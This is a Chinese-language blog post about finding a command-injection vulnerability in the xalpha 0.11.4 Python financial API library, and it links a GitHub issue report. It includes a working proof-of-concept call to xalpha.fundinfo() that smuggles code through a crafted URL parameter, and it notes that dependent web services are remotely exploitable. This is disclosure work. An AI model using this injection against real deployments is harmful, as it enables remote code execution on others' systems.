---
title: CVE实战 巧挖国产金融类python api库漏洞-高危命令执行0day
published: true
---
# [](#header-1)0、前言  

最近看到了某国内金融资产后端用该框架进行分析，于是浅浅记录一下挖洞过程  

整个过程非常的舒服，写个博客记录一下  

这个1.8k Stars的中体量国产api库犯了部分错误，让我在构造整个漏洞链的过程中还是比较舒服的，没有费脑子

就算遇到无法绕过的死路，也不至于推翻之前的构造链全部重新来过  

当然，这次挖掘在代码绕过方面也走了一点弯路，浪费了不少时间，吸取一下教训  

复现：
至少需要装python3  
xalpha==0.11.4库可以从github上下载，但最好用pip3直接就能把库拉到本地  

环境配置完毕后，执行以下代码  
```python
import xalpha
xalpha.fundinfo("../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend = print('hacked'); &_=1688890155531#")
```
就可以看到代码:print('hacked')成功被执行


由于这两天事情多，没时间写博客，恐怕只能先看github issue了  
[https://github.com/refraction-ray/xalpha/issues/175](https://github.com/refraction-ray/xalpha/issues/175)  
与仓库管理者的更多对话，包括对问题的解决方案的建议都写在issue里，比较完整  

比较有趣的是，repository负责人以为只是一个普通的local command execute，后来仔细想才发现，这是个api库啊！经过我后续排查，发现不少基于该项目的web项目都存在该漏洞，remote command execute


